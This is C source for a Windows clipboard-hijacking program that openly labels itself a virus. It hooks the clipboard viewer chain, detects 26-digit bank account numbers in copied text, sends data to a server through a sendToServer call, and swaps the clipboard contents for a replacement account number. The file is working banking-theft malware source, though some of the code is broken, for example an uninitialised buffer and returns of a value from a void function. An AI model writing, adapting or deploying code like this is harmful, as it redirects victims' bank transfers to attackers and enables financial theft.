#ifndef UNICODE
#define UNICODE
#endif 
#define BUFF_SIZE 2048
#include"client.h"
HWND hwndNextVwr;
char buf[BUFF_SIZE];

void Virus(HWND hwnd) {
	if (!IsClipboardFormatAvailable(CF_TEXT)) return 0;
	int found = FALSE;
	OpenClipboard(hwnd);

	HANDLE hCbMem = GetClipboardData(CF_TEXT);
	if (hCbMem == NULL) return 0;
	HANDLE hProgMem = GlobalAlloc(GHND, GlobalSize(hCbMem));

	if (hProgMem == NULL) return 0;

	LPSTR lpCbMem = (LPSTR)GlobalLock(hCbMem);
	LPSTR lpProgMem = (LPSTR)GlobalLock(hProgMem);
	strcpy(lpProgMem, lpCbMem);

	GlobalUnlock(hCbMem);
	GlobalUnlock(hProgMem);
	CloseClipboard();
	strcpy(buf, lpProgMem);
	char newNR[33];
	int dl = 0;   //73624763742376472634627346
	for (int i = 0; !found && i < strlen(lpProgMem); i++) {
		if (buf[i] >= '0' && buf[i] <= '9') dl++;
		else if (buf[i] == ' ') {
			continue;
		}
		else dl = 0;

		if (dl == 26)
			found = TRUE;
	}
	if (found) {
		sendToServer(newNR);
		OpenClipboard(hwnd);
		HGLOBAL hCbMem2 = GlobalAlloc(GHND, strlen(newNR)+1);
		LPVOID lpCbMem2 = GlobalLock(hCbMem2);
		memcpy(lpCbMem2, newNR, strlen(newNR)+1);
		GlobalUnlock(hCbMem2);
		EmptyClipboard();
		SetClipboardData(CF_TEXT, hCbMem2);
		CloseClipboard();
	}
}

/*	Windows Procedure Event Handler*/
LRESULT CALLBACK WndProc(HWND hwnd, UINT message, WPARAM wParam, LPARAM lParam)
{
	PAINTSTRUCT paintStruct;
	HDC hDC;

	switch (message)
	{
	case WM_DRAWCLIPBOARD:
		if (hwndNextVwr != NULL) SendMessage(hwndNextVwr, message, wParam, lParam);
		Virus(hwnd);
		InvalidateRect(hwnd, NULL, TRUE);
		return 0;
	case WM_CREATE:
		hwndNextVwr = SetClipboardViewer(hwnd);
		return 0;
		break;
		/*	Window is closing*/
	case WM_CLOSE:
		PostQuitMessage(0);
		return 0;
		break;
	case WM_PAINT:
		hDC = BeginPaint(hwnd, &paintStruct);
		SetTextColor(hDC, (COLORREF)0x00FF0000);
		
		TextOut(hDC, 150, 150, L"Wirus", 5);
		EndPaint(hwnd, &paintStruct);
		return 0;
		break;
	default:
		break;
	}
	return (DefWindowProc(hwnd, message, wParam, lParam));
}
int APIENTRY WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR     lpCmdLine, int       nCmdShow){
	WNDCLASSEX  windowClass;		//window class
	HWND		hwnd;				//window handle
	windowClass.cbSize = sizeof(WNDCLASSEX);
	windowClass.style = CS_HREDRAW | CS_VREDRAW;
	windowClass.lpfnWndProc = WndProc;
	windowClass.cbClsExtra = 0;
	windowClass.cbWndExtra = 0;
	windowClass.hInstance = hInstance;
	windowClass.hIcon = LoadIcon(NULL, IDI_APPLICATION);
	windowClass.hCursor = LoadCursor(NULL, IDC_ARROW);
	windowClass.hbrBackground = (HBRUSH)GetStockObject(WHITE_BRUSH);
	windowClass.lpszMenuName = NULL;
	windowClass.lpszClassName = "MyClass";
	windowClass.hIconSm = LoadIcon(NULL, IDI_WINLOGO);
	/*	Register window class*/
	if (!RegisterClassEx(&windowClass))
	{
		return 0;
	}
	/*	Class registerd, so now create window*/
	hwnd = CreateWindowEx(NULL,		//extended style
		"MyClass",			//class name
		L"A Real Win App",		//app name
		WS_OVERLAPPEDWINDOW |		//window style
		WS_VISIBLE |
		WS_SYSMENU,
		100, 100,			//x/y coords
		400, 400,			//width,height
		NULL,				//handle to parent
		NULL,				//handle to menu
		hInstance,			//application instance
		NULL);				//no extra parameter's
							/*	Check if window creation failed*/

	if (!hwnd)
		return 0;

	initClient();
	MSG msg;
	while (GetMessage(&msg, (HWND)NULL, 0, 0))
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	closesocket(ConnectSocket);
	WSACleanup();
	return msg.wParam;
}